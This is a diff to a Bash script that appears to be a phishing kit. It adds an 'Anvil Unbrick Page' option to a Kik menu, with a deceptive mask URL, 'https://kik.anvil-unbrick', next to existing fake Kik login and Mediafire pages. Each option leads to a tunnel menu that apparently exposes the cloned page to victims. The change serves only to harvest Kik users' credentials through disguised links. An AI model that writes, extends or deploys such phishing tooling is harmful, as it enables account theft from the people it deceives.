@@ -313,7 +313,8 @@ site_kik() {
 	cat <<- EOF
 		${RED}[${WHITE}01${RED}]${CYAN} Kik Login Page
 		${RED}[${WHITE}02${RED}]${CYAN} Ragebot Unbrik Page
-		${RED}[${WHITE}03${RED}]${CYAN} Mediafire Login Page for Kik
+		${RED}[${WHITE}03${RED}]${CYAN} Anvil Unbrick Page
+		${RED}[${WHITE}04${RED}]${CYAN} Mediafire Login Page for Kik
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -327,6 +328,10 @@ site_kik() {
 		mask='https://kik.com-unbrik'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		website="kik_anvil"
+		mask='https://kik.anvil-unbrick'
+		tunnel_menu
+	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
 		website="kik"
 		mask='https://kik.com-videos'
 		tunnel_menu
